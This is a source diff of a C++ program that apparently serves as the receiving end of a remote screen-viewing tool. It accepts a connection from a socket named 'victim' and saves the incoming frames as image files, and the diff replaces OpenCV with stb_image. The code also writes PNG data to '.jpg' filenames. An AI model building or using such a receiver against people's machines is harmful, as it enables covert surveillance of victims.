@@ -3,31 +3,33 @@
 #include <vector>
 #include <cstring>
 #include <string>
-#include <opencv2/opencv.hpp>
-#define port "23112"
+#include <fstream>
+#define STB_IMAGE_IMPLEMENTATION
+#include "stb_image.h"
+#define STB_IMAGE_WRITE_IMPLEMENTATION
+#include "stb_image_write.h"
+#define port 23112
 unsigned int frame_number = 0;
+
 
 bool try_to_get_image(std::vector<char> buffer)
 {
-    cv::Mat img;
-    img = cv::imdecode(cv::Mat(1, buffer.size(), CV_8UC1, (uchar *)buffer.data()), cv::IMREAD_UNCHANGED);
-    if (img.data == NULL)
+
+    int width, height, channels;
+    unsigned char* img_data = stbi_load_from_memory(reinterpret_cast<const stbi_uc*>(buffer.data()), buffer.size(), &width, &height, &channels, 0);
+    if (!img_data)
     {
+        std::cout << "FALLADO" << std::endl;
         return false;
     }
-    if (!img.empty())
-    {
-        frame_number++;
-        std::string path = "C:\\frames_grabbed\\frame";
-        path+= std::to_string(frame_number);
-        path+= ".jpg";
-        cv::imwrite(path,img);
-        return true;
-    }
-    else
-    {
-        return false;
-    }
+    std::ofstream file;
+    std::string path = "image" + std::to_string(frame_number++) +".jpg";
+    stbi_write_png(path.c_str(), width, height, channels, img_data, 0);
+
+    std::cout << width << "/" << height << std::endl;
+
+    stbi_image_free(img_data);
+    return true;
 }
 
 bool get_header(int socket, std::uint64_t *var)
@@ -61,6 +63,9 @@ bool get_header(int socket, std::uint64_t *var)
 
 int main()
 {
+    std::cout << "############################\n";
+    std::cout << "##      WINDOW VIEWER     ##\n";
+    std::cout << "############################\n";
     SOCKET victim = connect_to_client(port);
     int r = 0;
     while (true)
